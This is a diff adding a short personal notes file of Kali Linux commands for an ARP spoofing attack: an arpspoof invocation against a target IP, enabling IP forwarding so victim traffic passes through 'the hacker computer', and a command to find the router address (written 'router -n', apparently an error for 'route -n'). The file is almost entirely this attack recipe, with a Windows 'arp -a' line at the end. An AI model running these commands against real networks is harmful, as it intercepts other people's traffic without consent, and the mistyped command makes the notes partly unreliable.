@@ -1,0 +1,20 @@
+# Kali linux commands
+
+# ARP SPOOF
+# -i refers to the interface that is conected to the net
+# -t refers to de ip target
+arpspoof -i eth0 -t src_ip target_ip
+
+# To allow that packets flows into the hacker computer 
+# as a router run the following commands
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# To see the ip of the router you must use
+router -n
+
+#===========================================================
+
+# Windows commands
+
+# To see ARP Table
+arp -a
